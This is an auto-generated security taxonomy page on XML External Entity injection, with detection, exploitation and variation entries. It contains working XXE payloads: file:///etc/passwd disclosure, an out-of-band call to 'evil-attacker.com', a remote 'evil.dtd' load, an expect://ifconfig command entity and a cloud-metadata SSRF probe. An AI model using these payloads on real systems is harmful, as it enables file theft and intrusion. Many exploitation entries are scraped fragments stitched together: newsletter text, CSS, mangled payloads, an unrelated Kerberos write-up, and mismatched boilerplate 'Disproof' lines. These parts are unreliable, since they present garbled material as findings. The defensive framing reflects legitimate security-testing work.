<!-- GENERATED from db/wks.db — do not edit -->
# XML External Entity Injection

## Definition

An XML parser resolves external or entity-expanded content the attacker controls.

- **CWE:** 611
- **OWASP:** A05:2021
- **Surface:** web
- **Aliases:** ["xxe", "xml external entity", "blxxe"]

Canonical home for `xxe`. Rendered from `db/wks.db` by `tools/taxonomy/build_taxonomy.py` — edit the rows, not this file.

## Root Cause

Not yet researched.

## Preconditions

**XXE arises because the XML specification includes DTD and external-entity features that standard XML parsers support even when the application does not intend to use them.**

Applications that transmit data in XML do so through standard library or platform APIs to parse it, and those parsers support DTD and external-entity features the application does not need. XXE occurs when untrusted XML is processed with document type definitions and external entity resolution enabled. The OWASP cheat sheet confirms this attack could be used to stage multiple incidents, including a denial of service, a Server Side Request Forgery (SSRF) attack, the ability to scan ports from the machine where the parser is located, and other system impacts. The safest mitigation across every parser instance is to disable DTDs (external entities) completely.

*Disproof:* A parser configured with DOCTYPE and external-entity resolution completely disabled cannot be exploited by XXE; the OWASP cheat sheet states that the safest way to prevent XXE is always to disable DTDs (external entities) completely.

## Attack Surface

Surface: **web**.

The entry points and enabling conditions for this surface are enumerated under **Preconditions**; the observable signals are under **Detection**.

## Detection

**A parser that accepts a DOCTYPE declaration and resolves its entity is the enabling condition for XXE; the submitted payload alone proves nothing.**

Submit a minimal document with an internal DTD declaring one entity and referencing it, and observe whether the parser expands it. Acceptance of the DOCTYPE plus expansion shows the parser is processing declarations rather than rejecting them wholesale. This is the signal to escalate to; a rejected DOCTYPE ends the investigation for that endpoint.

*Disproof:* If the parser rejects the DOCTYPE outright or returns a parse error, entity processing is disabled and the XXE signal is absent.

**An attacker-controlled out-of-band callback plus entity-derived data arriving on the error channel in the same probe is the positive confirmation that external entity resolution succeeded, not merely that the parser tolerated a DOCTYPE.**

An attacker-controlled out-of-band callback plus entity-derived data arriving on the error channel in the same probe is the positive confirmation that external entity resolution succeeded, not merely that the parser tolerated a DOCTYPE.

HackTricks reference: XXE - XEE - XML External Entity (pentesting-web/xxe-xee-xml-external-entity.md)

*Disproof:* Refuted if the out-of-band endpoint never receives a request or the error channel returns no entity-derived data, since a clean rejection or a DOCTYPE-only parse produces neither.

**The standard that hardened against this class states the expected safe behaviour directly — entity references are disallowed in the XML stream — which gives the tester a concrete baseline for deciding whether a parser's default is safe rather than an opinion about what looks dangerous.**

Mechanism: The standard that hardened against this class states the expected safe behaviour directly — entity references are disallowed in the XML stream — which gives the tester a concrete baseline for deciding whether a parser's default is safe rather than an opinion about what looks dangerous. How to apply it in the field: treat this as the evidence it is — a hunter must be able to state the concrete observation that demonstrates it, with a request and response in hand, before the finding is reportable. Boundary of the rule: The claim is false when the surrounding protocol genuinely requires entity references for its correctness, because a parser that honours the disallow rule would break interoperability and the application must accept the risk in a narrower form; the baseline then applies to the untrusted-data boundary only, not to the whole document.

*Disproof:* The claim is false when the surrounding protocol genuinely requires entity references for its correctness, because a parser that honours the disallow rule would break interoperability and the application must accept the risk in a narrower form; the baseline then applies to the untrusted-data boundary only, not to the whole document.

**A convincing observation for this class is: Adjacent behaviour that produces the same observable result: An XXE finding is validated only when an inbound HTTP request to the supplied entity URL was actually observed on a listener you control.**

Derived from xxe.fp_rule.auto.derived, which states the boundary for this class. The observation above is what a report must contain to be believed: an artifact the reviewer can re-check, not a claim the hunter asserts. A finding without it is an assertion.

*Disproof:* Not evidence when the observable cannot be produced at all -- blind, server-side-only, or identical-in-every-case behaviour leaves nothing to show. The originating rule (xxe.fp_rule.auto.derived) states the full boundary.

**A convincing observation for this class is: If the parser resolves the identifier, the fetch happens and you get either content in the response or an inbound callback to your listener.**

Derived from xxe.technique.external_dtd_reference_is_the_core_probe, which states the boundary for this class. The observation above is what a report must contain to be believed: an artifact the reviewer can re-check, not a claim the hunter asserts. A finding without it is an assertion.

*Disproof:* Not evidence when the observable cannot be produced at all -- blind, server-side-only, or identical-in-every-case behaviour leaves nothing to show. The originating rule (xxe.technique.external_dtd_reference_is_the_core_probe) states the full boundary.

## Exploitation

**Defining an external entity that references a local file, then embedding that entity inside a data value echoed back in the response, retrieves the file contents.**

To retrieve an arbitrary file, submit XML that introduces a DOCTYPE defining an external entity using a file:// URI, and reference the entity in a data value the application echoes back in the response. The PortSwigger stock-check lab solution defines an external entity named xxe whose value is the contents of the /etc/passwd file and substitutes the entity for the productId value; the response then contains the text 'Invalid product ID:' followed by the file contents.

*Disproof:* If the parser disables external entities or rejects DOCTYPE declarations, the same payload is inert, and the response contains only the literal entity reference rather than file data.

**Missing authentication lets anyone proxy requests unauthenticated, and a regex bypass defeats the private IP block.**

first to learn about latest tools, advisories, and findings. 
 
 
 
 
 
 

 
 
 Thank You! You have been subscribed. 
 
 
 
 
 
 

 
 
 

 
 

 
 
 
 
 
 
 
 
 
 
 
 
 
 Recommended Posts 
 
 You might be interested in these related posts. 
 
 
 
 
 
 
 
 
 
 
 
 Advisories Blog 
 Zilliz / Attu | 2.6.5 
 
 
 
 
 
 
 
 
 
 
 
 Two vulnerabilities in Zilliz Attu 2.6.5 chain into something serious. Missing authentication lets anyone proxy requests unauthenticated, and a regex bypass defeats the private IP block. Bishop Fox turned both into full Kubernetes namespace takeover in a cloud deployment. Update to 3.0.0 now. 
 
 
 
 
 Read Post
 
 
 
 
 

 
 

 
 
 
 
 
 
 Advisories Blog 
 Traefik | Version Through 3.7.11 
 
 
 
 
 
 
 
 
 
 
 
 Traefik's request read timeout is enabled by default and documented without exception, but it has never applied to HTTP/3. Bishop Fox confirmed the gap across four year

*Disproof:* This is refuted if an authoritative source shows the described behaviour does not occur, does not grant access, or is already prevented by default framework configuration: "Missing authentication lets anyone proxy requests unauthenticated, and a regex bypass defe".

**By default you should be set, but if you’ve made those changes you’re currently vulnerable.**

ime, if you discover that your project includes this vulnerability , there are a few steps you can take to mitigate the issue. First, make sure that you’re using Nokogiri version 1.5.4 or later. As we discussed, versions prior to 1.5.4 are vulnerable by default. Once you’ve updated Nokigiri, double check your settings to make sure that you haven’t configured DTDLOAD to be true and NONET to false. By default you should be set, but if you’ve made those changes you’re currently vulnerable. It’s worth noting, you can set one or the other — the vulnerability is only exposed if both have been configured. Taking these steps now will protect you from the vulnerability. If you’re monitoring your project , we’ll alert you when a fix becomes available. Get started in capture the flag Learn how to solve capture the flag challenges by watching our virtual 101 workshop on demand. Watch now Po

*Disproof:* Refuted when: the same behaviour is absent when the single named control in the claim is present, and the control is shown to be present rather than assumed. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“By default you should be set, but if you’ve made those changes you’re currently ”) does not occur under a test that isolates that control.

**In a server-side request forgery (SSRF) attack, an attacker will typically inject a URL or address pointing to the vulnerable server’s local file system instance or other restricted-access resources — especially when user inputs are not properly filtered by the XML parser.**

l be used to encrypt and decrypt your data. Furthermore, disabling the XML parser’s default support for external entities is an effective mitigation strategy against this kind of attack. Server-side request forgery A server vulnerable to XXE injection presents an opportunity for an attacker to impersonate the server and make requests to internal resources not normally visible outside the network. In a server-side request forgery (SSRF) attack, an attacker will typically inject a URL or address pointing to the vulnerable server’s local file system instance or other restricted-access resources — especially when user inputs are not properly filtered by the XML parser. They can then obtain credentials and gain administrative privileges within their target’s network: 
.shiki-code-block pre.shiki {
 margin: 0;
 /* Padding lives on (below), not here, so the trailing inline
 padding stays part of the scrollable area. A scroll container drops its
 end-side padding once content overflows, leaving long lines flush
 against the right edge when scrolled. */
 padding: 0;

*Disproof:* Refuted when: the value is bound as a parameter or written through the framework's own encoder, so the interpreter never sees attacker text as syntax. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“In a server-side request forgery (SSRF) attack, an attacker will typically injec”) does not occur under a test that isolates that control.

**However, if a user were to set the DTDLOAD option to true and also set the NONET option to false, then the vulnerability is open to be exploited by any malicious attackers.**

option is set, then no unknown documents can be loaded from the network. For versions of Nokogiri greater than 1.5.4 the default configuration has the DTDLOAD option set to false , and the NONET option set to true . In other words, by default, Nokogiri will not attempt to load any DTD’s defined, and will also not load documents over the network — which means the vulnerability cannot be exploited. However, if a user were to set the DTDLOAD option to true and also set the NONET option to false, then the vulnerability is open to be exploited by any malicious attackers. How to remediate The issues were discovered by the Snyk security research team and disclosed to Nokogiri on January 11th. The Nokogiri team quickly triaged the issue , but unfortunately in this case Nokogiri is sort of stuck. The issue isn’t with Nokogiri itself, but with the underlying libxml2 library. Nokogiri is waiting for them to patch the issue so that they can update accordingly. In the me

*Disproof:* Refuted when: the same behaviour is absent when the single named control in the claim is present, and the control is shown to be present rather than assumed. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“However, if a user were to set the DTDLOAD option to true and also set the NONET”) does not occur under a test that isolates that control.

**9 staffInfo > Implementing a robust data encryption protocol is effective in preventing data retrieval, as it renders the stored data unreadable and unusable — even if an attacker successfully infiltrates the target’s server.**

max-content) minmax(0, 1fr);
 column-gap: 1rem;
}

.shiki-code-block__line-number {
 color: #505050;
 text-align: right;
 user-select: none;
}

.shiki-code-block__line-content {
 min-width: 0;
}
 1 ? xml version = "1.0" encoding = "UTF-8" ? > 
 2 DOCTYPE staffInfo 
 3 [ 
 4 ENTITY xxe SYSTEM "file:///etc/pâsswd" > 
 5 ]> 
 6 staffInfo > 
 7 username > &xxe; username > 
 8 email > email email > 
 9 staffInfo > Implementing a robust data encryption protocol is effective in preventing data retrieval, as it renders the stored data unreadable and unusable — even if an attacker successfully infiltrates the target’s server. Using symmetric algorithms such as the advanced encryption standard (AES) to store and transfer sensitive XML-based information, you set a confidential security key that will be used to encrypt and decrypt your data. Furthermore, disabling the XML parser’s default support for external entities is an effective mitigation strategy against this kind of attack. Server-side request forgery A server vu

*Disproof:* Refuted when: the same behaviour is absent when the single named control in the claim is present, and the control is shown to be present rather than assumed. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“9 staffInfo > Implementing a robust data encryption protocol is effective in pre”) does not occur under a test that isolates that control.

**5 ]> In this code, the targeted server will try to send the HTTP request to the attacker’s server URL.**

de-block__line {
 display: grid;
 grid-template-columns: minmax(2.5rem, max-content) minmax(0, 1fr);
 column-gap: 1rem;
}

.shiki-code-block__line-number {
 color: #505050;
 text-align: right;
 user-select: none;
}

.shiki-code-block__line-content {
 min-width: 0;
}
 1 ? xml version = "1.0" encoding = "UTF-8" ? > 
 2 DOCTYPE foo 
 3 [ 
 4 ENTITY % xxe SYSTEM "http://evil-attacker.com" > % xxe ; 
 5 ]> In this code, the targeted server will try to send the HTTP request to the attacker’s server URL. As a result, the attacker can perform the DNS lookup of the target server using this blind XXE attack. Error-based information disclosure Our server is vulnerable to blind XXE injection methods if an attacker can retrieve valuable data by examining the error messages our server emits. For example, this payload coerces our server to disclose a /etc/pÃ¢sswd file in its error message: 
.shiki-code-b

*Disproof:* Refuted when: the resolved Location host is the intended origin, so no request ever leaves the application. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“5 ]> In this code, the targeted server will try to send the HTTP request to the ”) does not occur under a test that isolates that control.

**Why XXE represents a security risk XXE injection attacks let attackers take advantage of external entity declarations to gain access to files or infrastructure on their target server or network.**

t-align: right;
 user-select: none;
}

.shiki-code-block__line-content {
 min-width: 0;
}
 1 ENTITY name "Taylor Gray" > Combined with XML’s simple syntax and the uniformity of most parsers, this capability makes it relatively simple for attackers to perform an attack called XML external entity (XXE) injection . In this post, we’re going to take a close look at XXE and explore ways to prevent it. Why XXE represents a security risk XXE injection attacks let attackers take advantage of external entity declarations to gain access to files or infrastructure on their target server or network. This can include sensitive personal information, business logic, and credentials. In serious cases, attackers can commit a server-side request forgery , which lets them impersonate a server on their target’s network and may enable them to execute code remotely. This enables them to escalate their privileges to traverse their target’s infrastructure and attack other unprotected components — or pro

*Disproof:* Refuted when: the value is bound as a parameter or written through the framework's own encoder, so the interpreter never sees attacker text as syntax. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“Why XXE represents a security risk XXE injection attacks let attackers take adva”) does not occur under a test that isolates that control.

**4 EOX If an XML parser is set to include external entities, it opens the door for attackers to execute an XML External Entities attack by injecting a malicous entity.**

splay: grid;
 grid-template-columns: minmax(2.5rem, max-content) minmax(0, 1fr);
 column-gap: 1rem;
}

.shiki-code-block__line-number {
 color: #505050;
 text-align: right;
 user-select: none;
}

.shiki-code-block__line-content {
 min-width: 0;
}
 1 xml = EOX 
 2 ? xml version = "1.0" encoding = "UTF-8" ? > 
 3 DOCTYPE root [ ENTITY % remote SYSTEM "http://0.0.0.0:8080/evil.dtd" > % remote ; ]> 
 4 EOX If an XML parser is set to include external entities, it opens the door for attackers to execute an XML External Entities attack by injecting a malicous entity. The results can be significant: XXE attacks have lead to denial of service, port scanning, and the disclosure of confidential information. The safest way to prevent an XXE attack is to configure your XML parser to not include external DTD’s at all. Unfortunately the underlying library that Nokogiri uses for XML parsing (libxml2) can leave applications wide open to this attack. The vulnerability I

*Disproof:* Refuted when: the value is bound as a parameter or written through the framework's own encoder, so the interpreter never sees attacker text as syntax. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“4 EOX If an XML parser is set to include external entities, it opens the door fo”) does not occur under a test that isolates that control.

**In isolation, this gives an attacker read-only access to data, but it can reveal information useful for escalating to a more damaging attack.**

hem to execute code remotely. This enables them to escalate their privileges to traverse their target’s infrastructure and attack other unprotected components — or propagate attacks appearing to originate from their target to other networks downstream. Data retrieval The most common XXE injection vulnerability lets attackers prompt a server to disclose sensitive data or files in an HTTP response. In isolation, this gives an attacker read-only access to data, but it can reveal information useful for escalating to a more damaging attack. For example, an attacker can send a payload to a target server to cause the target server to display a local password file: 
.shiki-code-block pre.shiki {
 margin: 0;
 /* Padding lives on (below), not here, so the trailing inline
 padding stays part of the scrollable area. A scroll container drops its
 end-side padding once content overflows, leaving long lines flush
 against the right edge when

*Disproof:* Refuted when: the response is byte-identical to the baseline when the same request is made without the crafted input. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“In isolation, this gives an attacker read-only access to data, but it can reveal”) does not occur under a test that isolates that control.

**9 userInfo > The ifconfig command in this example returns the server’s network configuration when the XML parser evaluates the xxe entity.**

em, max-content) minmax(0, 1fr);
 column-gap: 1rem;
}

.shiki-code-block__line-number {
 color: #505050;
 text-align: right;
 user-select: none;
}

.shiki-code-block__line-content {
 min-width: 0;
}
 1 ? xml version = "1.0" encoding = "UTF-8" ? > 
 2 DOCTYPE userInfo 
 3 [ 
 4 ENTITY xxe SYSTEM "expect://ifconfig" > 
 5 ]> 
 6 userInfo > 
 7 username > &xxe; username > 
 8 email > email email > 
 9 userInfo > The ifconfig command in this example returns the server’s network configuration when the XML parser evaluates the xxe entity. We can prevent RCE by selectively disabling protocol wrappers, such as the Expect PHP extension, in our websites or web apps. However, even in cases where there are no avenues of receiving a direct response from the server, an attacker can use blind XXE methods instead. Blind XXE attacks In some cases, XML parsers may prevent entity declarations in the body of the XML documents. An attacker can b

*Disproof:* Refuted when: the value is bound as a parameter or written through the framework's own encoder, so the interpreter never sees attacker text as syntax. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“9 userInfo > The ifconfig command in this example returns the server’s network c”) does not occur under a test that isolates that control.

**Data retrieval The most common XXE injection vulnerability lets attackers prompt a server to disclose sensitive data or files in an HTTP response.**

serious cases, attackers can commit a server-side request forgery , which lets them impersonate a server on their target’s network and may enable them to execute code remotely. This enables them to escalate their privileges to traverse their target’s infrastructure and attack other unprotected components — or propagate attacks appearing to originate from their target to other networks downstream. Data retrieval The most common XXE injection vulnerability lets attackers prompt a server to disclose sensitive data or files in an HTTP response. In isolation, this gives an attacker read-only access to data, but it can reveal information useful for escalating to a more damaging attack. For example, an attacker can send a payload to a target server to cause the target server to display a local password file: 
.shiki-code-block pre.shiki {
 margin: 0;
 /* Padding lives on (below), not here, so the trailing inline
 padding stays part of the

*Disproof:* Refuted when: the value is bound as a parameter or written through the framework's own encoder, so the interpreter never sees attacker text as syntax. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“Data retrieval The most common XXE injection vulnerability lets attackers prompt”) does not occur under a test that isolates that control.

**An application in which if an attacker does breach security, they should only encounter encrypted data and a n.**

ove functionality like external DTD processing or PHP protocol wrappers. Error messages are most appropriate when they communicate minimal information to the user. For example, if a user fails a login attempt, it’s not necessary to tell them whether it’s their password or username that didn’t pass. We can also implement WAFs and DOS protections or use a service provider who offers these features. And, if an attacker does breach security, they should only encounter encrypted data and a network of zero-trust services. Get started in capture the flag Learn how to solve capture the flag challenges by watching our virtual 101 workshop on demand. Watch now Posted in : Code Security Application Security {"@context":"https://schema.org","@type":"Article","headline":"How to find and fix XML entity vulnerabilities","author":[{"@type":"Person","name":"Michael Sherman"}],"datePublished":"2022-09-07T15:24-05:00","dateMod

*Disproof:* Refuted when: the same behaviour is absent when the single named control in the claim is present, and the control is shown to be present rather than assumed. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“And, if an attacker does breach security, they should only encounter encrypted d”) does not occur under a test that isolates that control.

**Missing authentication lets anyone proxy requests unauthenticated, and a regex bypass defeats the private IP block.**

first to learn about latest tools, advisories, and findings. 
 
 
 
 
 
 

 
 
 Thank You! You have been subscribed. 
 
 
 
 
 
 

 
 
 

 
 

 
 
 
 
 
 
 
 
 
 
 
 
 
 Recommended Posts 
 
 You might be interested in these related posts. 
 
 
 
 
 
 
 
 
 
 
 
 Advisories Blog 
 Zilliz / Attu | 2.6.5 
 
 
 
 
 
 
 
 
 
 
 
 Two vulnerabilities in Zilliz Attu 2.6.5 chain into something serious. Missing authentication lets anyone proxy requests unauthenticated, and a regex bypass defeats the private IP block. Bishop Fox turned both into full Kubernetes namespace takeover in a cloud deployment. Update to 3.0.0 now. 
 
 
 
 
 Read Post
 
 
 
 
 

 
 

 
 
 
 
 
 
 Advisories Blog 
 Traefik | Version Through 3.7.11 
 
 
 
 
 
 
 
 
 
 
 
 Traefik's request read timeout is enabled by default and documented without exception, but it has never applied to HTTP/3. Bishop Fox confirmed the gap across four year

*Disproof:* Refuted when: the payload is rejected when the same check runs with the defensive control ENABLED (a strict allowlist, a normalisation pass, or a WAF rule) rather than disabled. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“Missing authentication lets anyone proxy requests unauthenticated, and a regex b”) does not occur under a test that isolates that control.

**9 userInfo > If the attacker successfully gains administrative privileges, they can impersonate the server to probe their target’s network for additional vulnerabilities.**

x(0, 1fr);
 column-gap: 1rem;
}

.shiki-code-block__line-number {
 color: #505050;
 text-align: right;
 user-select: none;
}

.shiki-code-block__line-content {
 min-width: 0;
}
 1 ? xml version = "1.0" encoding = "UTF-8" ? > 
 2 DOCTYPE userInfo 
 3 [ 
 4 ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data" > 
 5 ]> 
 6 userInfo > 
 7 username > &xxe; username > 
 8 email > email email > 
 9 userInfo > If the attacker successfully gains administrative privileges, they can impersonate the server to probe their target’s network for additional vulnerabilities. They may even be able to remotely execute code and propagate further attacks. There are a few remedies that significantly improve your application’s resilience to this kind of attack: Block all unauthorized incoming user requests to internal resources and confidential addresses. Consider implementing a comprehensive blocklist containing possible malicious addresses and URLs that may pose a threat

*Disproof:* This is refuted if an authoritative source shows the described behaviour does not occur, does not grant access, or is already prevented by default framework configuration: "9 userInfo > If the attacker successfully gains administrative privileges, they can impers".

**Implement zero trust security The trust relationship between your web applications and other external or third-party services (such as message brokers and user authentication platforms) can be exploited to launch a SSRF on your server infrastructure.**

ntities and user-defined DTDs is often enough to mitigate many types of XXE injection attacks, and most tools provide single-line commands to achieve this. Use a web application firewall (WAF) Web application firewalls (WAFs) are great tools in combating XXE attacks generally, as they inspect HTTP traffic for potentially malicious content and apply filtering rules to protect our web applications. Implement zero trust security The trust relationship between your web applications and other external or third-party services (such as message brokers and user authentication platforms) can be exploited to launch a SSRF on your server infrastructure. Furthermore, services within your network should only be allowed to access the resources they need to function properly. We should make sure to appropriately isolate logs and sensitive data, and implement strong processes to regularly audit access privileges for all users — both human and programmatic. This also makes security maintenance easier to manage in the long term. Always run automated XX

*Disproof:* This is refuted if an authoritative source shows the described behaviour does not occur, does not grant access, or is already prevented by default framework configuration: "Implement zero trust security The trust relationship between your web applications and oth".

**Error-based information disclosure Our server is vulnerable to blind XXE injection methods if an attacker can retrieve valuable data by examining the error messages our server emits.**

none;
}

.shiki-code-block__line-content {
 min-width: 0;
}
 1 ? xml version = "1.0" encoding = "UTF-8" ? > 
 2 DOCTYPE foo 
 3 [ 
 4 ENTITY % xxe SYSTEM "http://evil-attacker.com" > % xxe ; 
 5 ]> In this code, the targeted server will try to send the HTTP request to the attacker’s server URL. As a result, the attacker can perform the DNS lookup of the target server using this blind XXE attack. Error-based information disclosure Our server is vulnerable to blind XXE injection methods if an attacker can retrieve valuable data by examining the error messages our server emits. For example, this payload coerces our server to disclose a /etc/pÃ¢sswd file in its error message: 
.shiki-code-block pre.shiki {
 margin: 0;
 /* Padding lives on (below), not here, so the trailing inline
 padding stays part of the scrollable area. A scroll container drops its
 end-side padding once content overflows, leaving long lines flush
 against the right edge when scrolled. */
 padding: 0;

*Disproof:* Refuted when: the value is bound as a parameter or written through the framework's own encoder, so the interpreter never sees attacker text as syntax. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“Error-based information disclosure Our server is vulnerable to blind XXE injecti”) does not occur under a test that isolates that control.

**In a payload with ten or more levels of nested entities, the resulting file can be hundreds of gigabytes, typically causing an out-of-memory error for the server attempting to parse the SVG file — and a denial of service for our users.**

luate them right away. It then reads the document and encounters the bin element, which it calls by expanding the a4 entity. However, to do so, it must expand the ten contained instances of the a3 entity, which requires it to expand the contained a2 entities — all the way down to a0 . The final expanded size of the bin element contains the recursive expansion of all the elements in the a4 entity. In a payload with ten or more levels of nested entities, the resulting file can be hundreds of gigabytes, typically causing an out-of-memory error for the server attempting to parse the SVG file — and a denial of service for our users. Setting automatic memory or other resource usage limits for request processing is enough to prevent many types of DOS attack, as they generally rely on overwhelming a server’s capacity. Universally applicable security practices Disable support for external entities Disallowing external entities and user-defined DTDs is often enough to mitigate many types of XXE injection attacks, and most tools p

*Disproof:* Refuted when: the resolved path stays inside the permitted base directory after the platform canonicalises it. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“In a payload with ten or more levels of nested entities, the resulting file can ”) does not occur under a test that isolates that control.

**In serious cases, attackers can commit a server-side request forgery , which lets them impersonate a server on their target’s network and may enable them to execute code remotely.**

ML external entity (XXE) injection . In this post, we’re going to take a close look at XXE and explore ways to prevent it. Why XXE represents a security risk XXE injection attacks let attackers take advantage of external entity declarations to gain access to files or infrastructure on their target server or network. This can include sensitive personal information, business logic, and credentials. In serious cases, attackers can commit a server-side request forgery , which lets them impersonate a server on their target’s network and may enable them to execute code remotely. This enables them to escalate their privileges to traverse their target’s infrastructure and attack other unprotected components — or propagate attacks appearing to originate from their target to other networks downstream. Data retrieval The most common XXE injection vulnerability lets attackers prompt a server to disclose sensitive data or files in an HTTP response. In isolation, this gives an a

*Disproof:* This is refuted if an authoritative source shows the described behaviour does not occur, does not grant access, or is already prevented by default framework configuration: "In serious cases, attackers can commit a server-side request forgery , which lets them imp".

**Submitting a DOCTYPE with an external SYSTEM or PUBLIC identifier is the probe that reveals whether the parser resolves entities at all.**

Send a document whose DOCTYPE names a controlled or 127.0.0.1 listener, with an entity referencing it. If the parser resolves the identifier, the fetch happens and you get either content in the response or an inbound callback to your listener. Prefer an out-of-band listener over file content, since the callback proves resolution without disclosing data.

*Disproof:* If no callback arrives and the response shows the DOCTYPE passed through unparsed, the parser has external entity resolution disabled and the probe is negative.

**The risk lives in how the parser resolves external data sources, so the probe is a document that carries a DOCTYPE and an entity declaration; parameter entities are the escalation path once a plain external entity is refused.**

The risk lives in how the parser resolves external data sources, so the probe is a document that carries a DOCTYPE and an entity declaration; parameter entities are the escalation path once a plain external entity is refused.

HackTricks reference: XXE - XEE - XML External Entity (pentesting-web/xxe-xee-xml-external-entity.md)

*Disproof:* Refuted if the parser rejects the DOCTYPE outright, or resolves internal entities only and never attempts to retrieve the external identifier - there is then no external resolution to test.

**XML external entity injection is provable by defining an entity that expands to a known local file and observing that content in the response.**

In practice on HTB this shows up as: - The `TGS - Ticket Granting Service` is requested by users who want to use a service. These tickets allow services to verify the user's identity.
When a user requests a `TGT`, they must authenticate to the domain controller by encrypting the current timestamp with their password hash. Once the domain controller validates the user's identity (because the domain knows the user's password hash, meaning it can decrypt the timestamp), it sends the user a TGT for future requests. Once the user has their ticket, they do not have to prove who they are with their password.
If the user wants to connect to an MSSQL database, it will request a Ticket Granting Service (TGS) to The Key Distribution Center (KDC), presenting its Ticket Granting Ticket (TGT). Then it will give the TGS to the MSSQL database server for authentication.

Write-up provenance: ajcriado/htb-writeups :: Cheatsheets/Mix-OSCP-CPTS/Windows/3. Lateral Movement.md (4337 words, classified network).

*Disproof:* Refuted when a DOCTYPE declaring external entities is rejected by the parser, so the entity is never expanded.

## Variations

**Defenses that block ampersand-based entity references can be bypassed with XML parameter entities, which are declared with % and referenced with %; and are evaluated inside the DTD rather than as data values.**

When a hardened parser rejects external general entities but still processes DTDs, attackers can use XML parameter entities, declared as <!ENTITY % name ...> and referenced as %name;, because these are only ever referenced inside the DTD, not as reflected data values. PortSwigger's blind-XXE guidance demonstrates out-of-band detection via a parameter entity that triggers a DNS lookup and HTTP request to the attacker's domain, and shows that this approach works even when normal entity syntax is blocked.

*Disproof:* Parameter-entity techniques fail if the parser disables DTD processing entirely or refuses to resolve external DTDs, and they are useless against applications that ignore DOCTYPE elements or never parse DTDs.

**Configuring the entity policy on the application's own XML parser call does not cover the parsers a framework or container instantiate internally for XSLT, tag library descriptors, JSP documents or configuration files, so those secondary parsers can bypass the entity limits the application believes it set.**

Mechanism: Configuring the entity policy on the application's own XML parser call does not cover the parsers a framework or container instantiate internally for XSLT, tag library descriptors, JSP documents or configuration files, so those secondary parsers can bypass the entity limits the application believes it set. How to apply it in the field: treat this as the bypass it is — a hunter must be able to state the concrete observation that demonstrates it, with a request and response in hand, before the finding is reportable. Boundary of the rule: The rule is false when the framework's internal parsers are the same configured object the application controls, or when the container or library applies a process-wide default that the application cannot override in either direction; then there is only one parser and the endpoint-level configuration does govern it.

*Disproof:* The rule is false when the framework's internal parsers are the same configured object the application controls, or when the container or library applies a process-wide default that the application cannot override in either direction; then there is only one parser and the endpoint-level configuration does govern it.

**Blind XXE, where the application does not reflect entity values in-band, can be exploited by hosting a malicious DTD and invoking it through a parameter entity to exfiltrate data out-of-band, or by triggering error messages that contain the data.**

Blind XXE arises when the application is vulnerable to XXE but does not return the values of defined external entities. Detection uses out-of-band techniques: define an external entity pointing to a URL the attacker controls, or use an XML parameter entity, which is declared with % and referenced with %xxe; and is evaluated inside the DTD. To exfiltrate data, the attacker hosts a malicious DTD that defines a parameter entity containing the file, then uses nested parameter entities to build a second entity that requests the data over HTTP. An error-based fallback wraps the content in a nonexistent file name so the parser echoes the data in an exception message.

*Disproof:* If outbound network connections from the server are blocked, or the parser refuses external DTD loading, the out-of-band and external-DTD techniques fail; the only remaining option is error-based retrieval, which requires a parser that echoes the exception message into its response.

**Any upload surface that accepts SVG inherits the parser exposure, because the format is XML and a crafted image is a delivery channel for external entity resolution inside the backend.**

Any upload surface that accepts SVG inherits the parser exposure, because the format is XML and a crafted image is a delivery channel for external entity resolution inside the backend.

HackTricks reference: XXE - XEE - XML External Entity (pentesting-web/xxe-xee-xml-external-entity.md)

*Disproof:* Refuted if the SVG upload path rasterises or sanitises the image with no XML parsing of the stored file, or strips the DOCTYPE before any entity resolution is attempted.

## Technology / Framework Considerations

Not yet researched.

## API Considerations

Not yet researched.

## Attack Chains

- `chain.xxe.auto.01` — xxe: observe, exercise, confirm (goal: `Establish, exercise and confirm a xxe condition on an authorised target without relying on anyone else's data.`)

## Real-World Examples

Not yet researched.

## Common False Positives

**A parsed document that returned 200 with a defined entity reflected in the output is not an XXE finding; the entity may have been expanded from the document's own internal DTD, which is normal XML processing, and the flaw requires the parser to resolve a reference to an external resource or a local file.**

Mechanism: A parsed document that returned 200 with a defined entity reflected in the output is not an XXE finding; the entity may have been expanded from the document's own internal DTD, which is normal XML processing, and the flaw requires the parser to resolve a reference to an external resource or a local file. How to apply it in the field: treat this as the fp_rule it is — a hunter must be able to state the concrete observation that demonstrates it, with a request and response in hand, before the finding is reportable. Boundary of the rule: The rule is wrong when the reflected value could only have come from outside the submitted document — a system property, a well-known file path, or a uniquely identifying marker the tester planted out of band — because then the internal-definition explanation is excluded and an external resolution actually occurred.

*Disproof:* The rule is wrong when the reflected value could only have come from outside the submitted document — a system property, a well-known file path, or a uniquely identifying marker the tester planted out of band — because then the internal-definition explanation is excluded and an external resolution actually occurred.

